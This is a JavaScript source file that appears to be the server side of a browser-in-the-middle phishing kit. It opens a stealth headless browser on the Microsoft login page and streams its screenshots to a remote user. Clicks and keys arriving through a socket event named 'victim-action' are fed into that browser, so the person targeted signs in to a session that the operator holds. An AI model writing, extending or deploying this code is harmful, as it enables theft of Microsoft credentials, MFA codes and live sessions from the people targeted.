const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

async function startSession(io, socket) {
    console.log(`[INIT] Interactive Session: ${socket.id}`);
    let browser;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--single-process'
            ]
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 35 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        console.log(`[NAV] Directing to Microsoft...`);
        page.goto('https://login.microsoftonline.com/', { waitUntil: 'domcontentloaded' }).catch(() => {});

        // Maintain visual sync
        const heartbeat = setInterval(emitFrame, 1200);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') {
                    await page.mouse.click(data.x, data.y);
                } 
                else if (data.type === 'key') {
                    // This is the critical update: forwarding physical keys to headless browser
                    await page.keyboard.press(data.key);
                }
                // Refresh immediately after action for responsiveness
                await emitFrame();
            } catch (err) {
                console.error('[ACTION-ERR]', err.message);
            }
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            if (browser) await browser.close();
            console.log(`[EXIT] Session closed: ${socket.id}`);
        });

    } catch (error) {
        console.error('[FATAL]', error.message);
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
